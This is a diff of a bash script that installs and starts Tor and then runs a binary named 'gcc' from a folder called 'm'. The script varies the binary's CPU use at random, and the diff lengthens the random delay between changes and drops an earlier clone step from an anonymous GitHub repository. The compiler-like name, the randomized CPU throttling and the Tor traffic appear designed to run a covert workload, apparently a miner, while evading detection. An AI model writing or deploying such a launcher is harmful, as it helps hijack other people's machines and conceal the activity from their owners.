@@ -6,11 +6,9 @@ set -u
 # CONFIGURATION
 # ------------------------------------------------------------
 
-# The repository to clone
-REPO_URL="https://github.com/anonymousperson456/m"
 # The binary inside the repo to run
 BINARY_NAME="gcc" 
-BINARY_PATH="./${BINARY_NAME}"
+BINARY_PATH="./m/${BINARY_NAME}"
 
 # Random CPU target:
 MIN_PERCENT=1
@@ -18,7 +16,7 @@ MAX_PERCENT=100
 
 # Random delay between changes (seconds):
 MIN_DELAY=1
-MAX_DELAY=30
+MAX_DELAY=60
 
 # ------------------------------------------------------------
 # SETUP & CLEANUP
@@ -31,17 +29,13 @@ echo "=========================================="
 # 2. Update System & Install Tor
 echo "[*] Updating system and installing Tor..."
 apt update -y
-apt install git tor -y 
+apt install tor -y 
 
 # 3. Start Tor in the background
 echo "[*] Starting Tor daemon..."
 (tor &)
 # Wait briefly for Tor to initialize
 sleep 2
-
-# 4. Clone the repository
-echo "[*] Cloning ${REPO_URL}..."
-git clone "${REPO_URL}"
 
 # 5. Make executable and verify
 if [ ! -x "${BINARY_PATH}" ]; then
